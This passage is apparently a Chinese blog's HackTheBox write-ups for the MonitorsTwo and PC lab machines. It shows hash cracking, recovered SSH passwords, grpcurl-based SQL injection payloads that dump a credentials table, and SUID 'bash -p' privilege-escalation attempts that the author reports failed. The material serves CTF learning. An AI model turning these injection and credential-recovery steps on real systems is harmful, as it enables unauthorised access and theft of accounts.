+<p>密码都是哈希过的</p>
+<p>用hashcat反解$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ&#x2F;iuqMft&#x2F;llx8utpR1hjC的明文</p>
+<p>解出来后得到密码</p>
+<h3 id="3-ssh连接"><a href="#3-ssh连接" class="headerlink" title="3.ssh连接"></a>3.ssh连接</h3><p>然后ssh连接</p>
+<p><code>ssh marcus@monitorstwo.htb </code></p>
+<p>如果提示找不到</p>
+<p><code>vim /etc/hosts</code> 添加</p>
+<p> 10.10.11.211 monitorstwo.htb即可</p>
+<p><strong>funkymonkey.</strong></p>
+<h3 id="4-cat-user-txt"><a href="#4-cat-user-txt" class="headerlink" title="4.cat user.txt"></a>4.cat user.txt</h3><p>获取到flag。</p>
+<h3 id="获取root-txt"><a href="#获取root-txt" class="headerlink" title="获取root.txt"></a>获取root.txt</h3><p>我没成功</p>
+<h3 id="5-findmnt"><a href="#5-findmnt" class="headerlink" title="5.findmnt"></a>5.findmnt</h3><p><code>findmnt</code>&#x2F;&#x2F;显示当前挂载命令</p>
+<blockquote>
+<pre><code>                                            nsfs      rw
+</code></pre>
+<p>├─&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec&#x2F;merged<br>│                                     overlay    overlay   rw,relatime,lowerdir&#x3D;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;75<br>├─&#x2F;var&#x2F;lib&#x2F;docker&#x2F;containers&#x2F;e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69&#x2F;mounts&#x2F;shm<br>│                                     shm        tmpfs     rw,nosuid,nodev,noexec,relatime,size&#x3D;65536k<br>├─&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1&#x2F;merged<br>│                                     overlay    overlay   rw,relatime,lowerdir&#x3D;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;4Z<br>└─&#x2F;var&#x2F;lib&#x2F;docker&#x2F;containers&#x2F;50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e&#x2F;mounts&#x2F;shm<br>                                      shm        tmpfs     rw,nosuid,nodev,noexec,relatime,size&#x3D;65536k</p>
+</blockquote>
+<blockquote>
+<p>marcus@monitorstwo:~$ ls -la &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1&#x2F;merged<br>total 108<br>drwxr-xr-x 1 root root  4096 Mar 21 10:49 .<br>drwx—–x 5 root root  4096 Jun 21 15:30 ..<br>drwxr-xr-x 1 root root  4096 Mar 22 13:21 bin<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 boot<br>drwxr-xr-x 1 root root  4096 Mar 21 10:49 dev<br>-rwxr-xr-x 1 root root     0 Mar 21 10:49 .dockerenv<br>-rwxr-xr-x 1 root root     0 Jan  5 11:37 entrypoint.sh<br>drwxr-xr-x 1 root root  4096 Mar 21 10:49 etc<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 home<br>drwxr-xr-x 1 root root  4096 Nov 15  2022 lib<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 lib64<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 media<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 mnt<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 opt<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 proc<br>drwx—— 1 root root  4096 Mar 21 10:50 root<br>drwxr-xr-x 1 root root  4096 Nov 15  2022 run<br>drwxr-xr-x 1 root root  4096 Jan  9 09:30 sbin<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 srv<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 sys<br>drwxrwxrwt 1 root root 20480 Jun 21 16:14 tmp<br>drwxr-xr-x 1 root root  4096 Nov 14  2022 usr<br>drwxr-xr-x 1 root root  4096 Nov 15  2022 var</p>
+</blockquote>
+<h3 id="6-x2F-bin-x2F-bash-p"><a href="#6-x2F-bin-x2F-bash-p" class="headerlink" title="6.  .&#x2F;bin&#x2F;bash -p"></a>6.  .&#x2F;bin&#x2F;bash -p</h3><blockquote>
+<p>marcus@monitorstwo:~$ ls -la &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1&#x2F;merged&#x2F;bin&#x2F;bash<br>-rwxr-xr-x 1 root root 1234376 Mar 27  2022 &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1&#x2F;merged&#x2F;bin&#x2F;bash</p>
+</blockquote>
+<blockquote>
+<p>&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1&#x2F;merged&#x2F;bin&#x2F;bash -p</p>
+</blockquote>
+<blockquote>
+<p>marcus@monitorstwo:~$ cd &#x2F;root<br>bash: cd: &#x2F;root: Permission denied</p>
+</blockquote>
+<p>-p命令执行没效果。</p>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>找到cms版本漏洞，使用已存在的漏洞进行攻击，通过监听拿到shell。</p>
+<h2 id="4-PC"><a href="#4-PC" class="headerlink" title="4.PC"></a>4.PC</h2><h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_64201116/article/details/130940490">HTB PC_清风–的博客-CSDN博客</a></p>
+<p>[htb pc wp_春猿火的博客-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_56308852/article/details/131020148?ops_request_misc=%7B%22request_id%22:%22168751647616800213092172%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168751647616800213092172&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-3-131020148-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=htb">https://blog.csdn.net/m0_56308852/article/details/131020148?ops_request_misc=%7B%22request%5Fid%22%3A%22168751647616800213092172%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=168751647616800213092172&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-3-131020148-null-null.142^v88^control_2,239^v2^insert_chatgpt&amp;utm_term=htb</a> pc&amp;spm&#x3D;1018.2226.3001.4187)</p>
+<h3 id="1-扫描端口-1"><a href="#1-扫描端口-1" class="headerlink" title="1.扫描端口"></a>1.扫描端口</h3><p>默认扫描只扫到了22端口，试试全端口扫描</p>
+<p><code>nmap -p0-65535 10.10.11.214</code></p>
+<blockquote>
+<p>22&#x2F;tcp    open  ssh<br>50051&#x2F;tcp open  unknown</p>
+</blockquote>
+<h3 id="2-未知端口50051"><a href="#2-未知端口50051" class="headerlink" title="2.未知端口50051"></a>2.未知端口50051</h3><p>搜索引擎搜一下，说是grpc的默认端口为50051</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230623140547228.png"></p>
+<blockquote>
+<p>Google远程过程调用（Google Remote Procedure Call，gRPC）是基于HTTP 2.0传输层协议承载的高性能开源RPC软件框架，为管理和配置网络设备提供了一种API接口设计的方法。gRPC提供了多种编程语言，如C、Java、golong、python等。<br>gRPC可以作为数据传输协议与Telemetry技术配合使用，可实时、高速、精确的监控网络设备的运行状态。此外，网络设备提供了一种基于gRPC方式来管理设备的方法，包括配置、查询和能力获取三种方法。这些方法是通过设备和采集器对接，实现采集设备数据的功能。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/fullstorydev/grpcui">https://github.com/fullstorydev/grpcui</a></p>
+<p>下载链接工具。 但是要go环境。</p>
+<h4 id="gRPC"><a href="#gRPC" class="headerlink" title="gRPC"></a>gRPC</h4><p>那就找docker的</p>
+<p><code>docker pull fullstorydev/grpcurl:latest</code></p>
+<p>启动</p>
+<p><code>docker run fullstorydev/grpcurl -plaintext 10.10.11.214:50051  </code>  </p>
+<p>少了参数。</p>
+<p>-help</p>
+<p>然后出现以下帮助</p>
+<blockquote>
+<p>Usage:<br>        &#x2F;bin&#x2F;grpcurl [flags] [address] [list|describe] [symbol]</p>
+<p>The ‘address’ is only optional when used with ‘list’ or ‘describe’ and a<br>protoset or proto flag is provided.</p>
+<p>If ‘list’ is indicated, the symbol (if present) should be a fully-qualified<br>service name. If present, all methods of that service are listed. If not<br>present, all exposed services are listed, or all services defined in protosets.</p>
+<p>If ‘describe’ is indicated, the descriptor for the given symbol is shown. The<br>symbol should be a fully-qualified service, enum, or message name. If no symbol<br>is given then the descriptors for all exposed or known services are shown.</p>
+<p>If neither verb is present, the symbol must be a fully-qualified method name in<br>‘service&#x2F;method’ or ‘service.method’ format. In this case, the request body will<br>be used to invoke the named method. If no body is given but one is required<br>(i.e. the method is unary or server-streaming), an empty instance of the<br>method’s request type will be sent.</p>
+<p>The address will typically be in the form “host:port” where host can be an IP<br>address or a hostname and port is a numeric port or service name. If an IPv6<br>address is given, it must be surrounded by brackets, like “[2001:db8::1]”. For<br>Unix variants, if a -unix&#x3D;true flag is present, then the address must be the<br>path to the domain socket.</p>
+<p>Available flags:<br>  -H value<br>        Additional headers in ‘name: value’ format. May specify more than one<br>        via multiple flags. These headers will also be included in reflection<br>        requests to a server.<br>  -allow-unknown-fields<br>        When true, the request contents, if ‘json’ format is used, allows<br>        unknown fields to be present. They will be ignored when parsing<br>        the request.<br>  -authority string<br>        The authoritative name of the remote server. This value is passed as the<br>        value of the “:authority” pseudo-header in the HTTP&#x2F;2 protocol. When TLS<br>        is used, this will also be used as the server name when verifying the<br>        server’s certificate. It defaults to the address that is provided in the<br>        positional arguments.<br>  -cacert string<br>        File containing trusted root certificates for verifying the server.<br>        Ignored if -insecure is specified.<br>  -cert string<br>        File containing client certificate (public key), to present to the<br>        server. Not valid with -plaintext option. Must also provide -key option.<br>  -connect-timeout float<br>        The maximum time, in seconds, to wait for connection to be established.<br>        Defaults to 10 seconds.<br>  -d string<br>        Data for request contents. If the value is ‘@’ then the request contents<br>        are read from stdin. For calls that accept a stream of requests, the<br>        contents should include all such request messages concatenated together<br>        (possibly delimited; see -format).<br>  -emit-defaults<br>        Emit default values for JSON-encoded responses.<br>  -expand-headers<br>        If set, headers may use ‘${NAME}’ syntax to reference environment<br>        variables. These will be expanded to the actual environment variable<br>        value before sending to the server. For example, if there is an<br>        environment variable defined like FOO&#x3D;bar, then a header of<br>        ‘key: ${FOO}’ would expand to ‘key: bar’. This applies to -H,<br>        -rpc-header, and -reflect-header options. No other expansion&#x2F;escaping is<br>        performed. This can be used to supply credentials&#x2F;secrets without having<br>        to put them in command-line arguments.<br>  -format string<br>        The format of request data. The allowed values are ‘json’ or ‘text’. For<br>        ‘json’, the input data must be in JSON format. Multiple request values<br>        may be concatenated (messages with a JSON representation other than<br>        object must be separated by whitespace, such as a newline). For ‘text’,<br>        the input data must be in the protobuf text format, in which case<br>        multiple request values must be separated by the “record separator”<br>        ASCII character: 0x1E. The stream should not end in a record separator.<br>        If it does, it will be interpreted as a final, blank message after the<br>        separator. (default “json”)<br>  -format-error<br>        When a non-zero status is returned, format the response using the<br>        value set by the -format flag .<br>  -help<br>        Print usage instructions and exit.<br>  -import-path value<br>        The path to a directory from which proto sources can be imported, for<br>        use with -proto flags. Multiple import paths can be configured by<br>        specifying multiple -import-path flags. Paths will be searched in the<br>        order given. If no import paths are given, all files (including all<br>        imports) must be provided as -proto flags, and grpcurl will attempt to<br>        resolve all import statements from the set of file names given.<br>  -insecure<br>        Skip server certificate and domain verification. (NOT SECURE!) Not<br>        valid with -plaintext option.<br>  -keepalive-time float<br>        If present, the maximum idle time in seconds, after which a keepalive<br>        probe is sent. If the connection remains idle and no keepalive response<br>        is received for this same period then the connection is closed and the<br>        operation fails.<br>  -key string<br>        File containing client private key, to present to the server. Not valid<br>        with -plaintext option. Must also provide -cert option.<br>  -max-msg-sz int<br>        The maximum encoded size of a response message, in bytes, that grpcurl<br>        will accept. If not specified, defaults to 4,194,304 (4 megabytes).<br>  -max-time float<br>        The maximum total time the operation can take, in seconds. This is<br>        useful for preventing batch jobs that use grpcurl from hanging due to<br>        slow or bad network links or due to incorrect stream method usage.<br>  -msg-template<br>        When describing messages, show a template of input data.<br>  -plaintext<br>        Use plain-text HTTP&#x2F;2 when connecting to server (no TLS).<br>  -proto value<br>        The name of a proto source file. Source files given will be used to<br>        determine the RPC schema instead of querying for it from the remote<br>        server via the gRPC reflection API. When set: the ‘list’ action lists<br>        the services found in the given files and their imports (vs. those<br>        exposed by the remote server), and the ‘describe’ action describes<br>        symbols found in the given files. May specify more than one via multiple<br>        -proto flags. Imports will be resolved using the given -import-path<br>        flags. Multiple proto files can be specified by specifying multiple<br>        -proto flags. It is an error to use both -protoset and -proto flags.<br>  -protoset value<br>        The name of a file containing an encoded FileDescriptorSet. This file’s<br>        contents will be used to determine the RPC schema instead of querying<br>        for it from the remote server via the gRPC reflection API. When set: the<br>        ‘list’ action lists the services found in the given descriptors (vs.<br>        those exposed by the remote server), and the ‘describe’ action describes<br>        symbols found in the given descriptors. May specify more than one via<br>        multiple -protoset flags. It is an error to use both -protoset and<br>        -proto flags.<br>  -protoset-out string<br>        The name of a file to be written that will contain a FileDescriptorSet<br>        proto. With the list and describe verbs, the listed or described<br>        elements and their transitive dependencies will be written to the named<br>        file if this option is given. When invoking an RPC and this option is<br>        given, the method being invoked and its transitive dependencies will be<br>        included in the output file.<br>  -reflect-header value<br>        Additional reflection headers in ‘name: value’ format. May specify more<br>        than one via multiple flags. These headers will <em>only</em> be used during<br>        reflection requests and will be excluded when invoking the requested RPC<br>        method.<br>  -rpc-header value<br>        Additional RPC headers in ‘name: value’ format. May specify more than<br>        one via multiple flags. These headers will <em>only</em> be used when invoking<br>        the requested RPC method. They are excluded from reflection requests.<br>  -servername string<br>        Override server name when validating TLS certificate. This flag is<br>        ignored if -plaintext or -insecure is used.<br>        NOTE: Prefer -authority. This flag may be removed in the future. It is<br>        an error to use both -authority and -servername (though this will be<br>        permitted if they are both set to the same value, to increase backwards<br>        compatibility with earlier releases that allowed both to be set).<br>  -unix<br>        Indicates that the server address is the path to a Unix domain socket.<br>  -use-reflection<br>        When true, server reflection will be used to determine the RPC schema.<br>        Defaults to true unless a -proto or -protoset option is provided. If<br>        -use-reflection is used in combination with a -proto or -protoset flag,<br>        the provided descriptor sources will be used in addition to server<br>        reflection to resolve messages and extensions.<br>  -user-agent string<br>        If set, the specified value will be added to the User-Agent header set<br>        by the grpc-go library.<br>  -v    Enable verbose output.<br>  -version<br>        Print version.<br>  -vv<br>        Enable very verbose output.</p>
+</blockquote>
+<p>&#x2F;&#x2F;list</p>
+<blockquote>
+<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext 10.10.11.214:50051 list<br>SimpleApp<br>grpc.reflection.v1alpha.ServerReflection</p>
+</blockquote>
+<p>&#x2F;&#x2F;describe查看</p>
+<blockquote>
+<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext 10.10.11.214:50051 describe SimpleApp<br>SimpleApp is a service:<br>service SimpleApp {<br>  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );<br>  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );<br>  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );<br>}</p>
+</blockquote>
+<p>&#x2F;&#x2F;查看注册请求方法</p>
+<blockquote>
+<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext 10.10.11.214:50051 describe .RegisterUserRequest<br>RegisterUserRequest is a message:<br>message RegisterUserRequest {<br>  string username &#x3D; 1;<br>  string password &#x3D; 2;<br>}</p>
+</blockquote>
+<p>&#x2F;&#x2F;注册一下</p>
+<blockquote>
+<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -d ‘{“username”:”123”,”password”:”123”}’ 10.10.11.214:50051 SimpleApp.RegisterUser<br>{<br>  “message”: “username or password must be greater than 4”<br>}</p>
+<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -d ‘{“username”:”1234”,”password”:”1234”}’ 10.10.11.214:50051 SimpleApp.RegisterUser<br>{<br>  “message”: “Account created for user 1234!”<br>}</p>
+</blockquote>
+<p>&#x2F;&#x2F;登录</p>
+<blockquote>
+<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext  -v -d ‘{“username”:”1234”,”password”:”1234”}’ 10.10.11.214:50051 SimpleApp.LoginUser</p>
+<p>&#x2F;&#x2F; -v是详细信息，后面有用的到的token</p>
+<p>Resolved method descriptor:<br>rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );</p>
+<p>Request metadata to send:<br>(empty)</p>
+<p>Response headers received:<br>content-type: application&#x2F;grpc<br>grpc-accept-encoding: identity, deflate, gzip</p>
+<p>Response contents:<br>{<br>  “message”: “Your id is 842.”<br>}</p>
+<p>Response trailers received:<br>token: b’eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM’<br>Sent 1 request and received 1 response</p>
+</blockquote>
+<p>&#x2F;&#x2F;getinfo</p>
+<blockquote>
+<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -d ‘{“id”:”728”}’ 10.10.11.214:50051 SimpleApp.getInfo<br>{<br>  “message”: “Authorization Error.Missing ‘token’ header”<br>}</p>
+<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -v -d ‘{“id”:”842”}’ -H “token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM” 10.10.11.214:50051 SimpleApp.getInfo</p>
+<p>Resolved method descriptor:<br>rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );</p>
+<p>Request metadata to send:<br>token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM</p>
+<p>Response headers received:<br>content-type: application&#x2F;grpc<br>grpc-accept-encoding: identity, deflate, gzip</p>
+<p>Response contents:<br>{<br>  “message”: “Will update soon.”<br>}</p>
+<p>Response trailers received:<br>(empty)<br>Sent 1 request and received 1 response</p>
+</blockquote>
+<blockquote>
+<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -v -d ‘{“id”:”1’”}’ -H “token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM” 10.10.11.214:50051 SimpleApp.getInfo<br>dquote&gt; </p>
+</blockquote>
+<p>好，使用了go环境跑grpcui的大佬，是通过bp抓包，sqlmap得到，数据库是sqlite，密码为HereIsYourPassWord1431，用户名sau。</p>
+<blockquote>
+<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -v -d ‘{“id”:”1 union select 1”}’ -H “token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM” 10.10.11.214:50051 SimpleApp.getInfo</p>
+<p>Resolved method descriptor:<br>rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );</p>
+<p>Request metadata to send:<br>token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM</p>
+<p>Response headers received:<br>content-type: application&#x2F;grpc<br>grpc-accept-encoding: identity, deflate, gzip</p>
+<p>Response contents:<br>{<br>  “message”: “1”<br>}</p>
+<p>Response trailers received:<br>(empty)<br>Sent 1 request and received 1 response</p>
+</blockquote>
+<p>百度了下sqlite的语法</p>
+<blockquote>
+<p>SELECT type, name, tbl_name, rootpage, sql FROM sqlite_master WHERE type&#x3D;’table’;</p>
+</blockquote>
+<p><code>docker run fullstorydev/grpcurl -plaintext -v -d &#39;&#123;&quot;id&quot;:&quot;1 union select sql from sqlite_master where type=\&quot;table\&quot;&quot;&#125;&#39; -H &quot;token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM&quot; 10.10.11.214:50051 SimpleApp.getInfo</code></p>
+<blockquote>
+<p>…</p>
+<p>Response contents:<br>{<br>  “message”: “CREATE TABLE &quot;accounts&quot; (\n\tusername TEXT UNIQUE,\n\tpassword TEXT\n)”<br>}</p>
+</blockquote>
+<p>有一个accounts表，字段为username和password</p>
+<p><code>docker run fullstorydev/grpcurl -plaintext -v -d &#39;&#123;&quot;id&quot;:&quot;1 union select group_concat(username||\&quot;~\&quot;||password) from accounts&quot;&#125;&#39; -H &quot;token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM&quot; 10.10.11.214:50051 SimpleApp.getInfo</code></p>
+<blockquote>
+<p><code>||</code>符号通常用作字符串连接运算符，用于将两个字符串连接在一起。它在许多关系型数据库管理系统（包括SQLite）中都被广泛支持，跨数据库通用。用逗号这里貌似出错了。</p>
+</blockquote>
+<blockquote>
+<p>Response contents:<br>{<br>  “message”: “admin<del>admin,sau</del>HereIsYourPassWord1431”<br>}</p>
+</blockquote>
+<h3 id="3-ssh连接-1"><a href="#3-ssh连接-1" class="headerlink" title="3.ssh连接"></a>3.ssh连接</h3><p> <code>ssh sau@10.10.11.214</code> </p>
+<blockquote>
+<p> cat user.txt</p>
+</blockquote>
+<h3 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h3><p>sudo -l提权</p>
+<blockquote>
+<p>sau@pc:~$ sudo -l<br>[sudo] password for sau:<br>Sorry, user sau may not run sudo on localhost.</p>
+</blockquote>
+<p>suid提权</p>
+<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<blockquote>
+<p>用于查找具有 SetUID 权限的可执行文件</p>
+<ul>
+<li><p><code>find</code>：这是一个用于在文件系统中搜索文件和目录的命令。</p>
+</li>
+<li><p><code>/</code>：表示搜索的起始位置为根目录。</p>
+</li>
+<li><p><code>-perm -u=s</code>：这是<code>find</code>命令的选项之一。<code>-perm</code>用于匹配文件的权限，<code>-u=s</code>表示匹配具有 SetUID 权限的文件。</p>
+</li>
+<li><p><code>-type f</code>：这是<code>find</code>命令的另一个选项，指定要搜索的文件类型为普通文件。</p>
+</li>
+<li><p><code>2&gt;/dev/null</code>：将标准错误输出重定向到 <code>/dev/null</code>，这样可以隐藏权限错误信息。</p>
+<p>通常，SetUID 权限用于以文件所有者的权限而不是执行者的权限来执行文件。</p>
+</li>
+</ul>
+</blockquote>
+<p>发现了一个**&#x2F;usr&#x2F;bin&#x2F;bash**</p>
+<p><code>/usr/bin/bash -p</code></p>
+<p>按理说这样就可以是root身份了。</p>
+<p>奇怪，我还是没反应，whoami不是root。</p>
+<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>搜索未知端口的服务入手。</p>
  
       <!-- reward -->
       
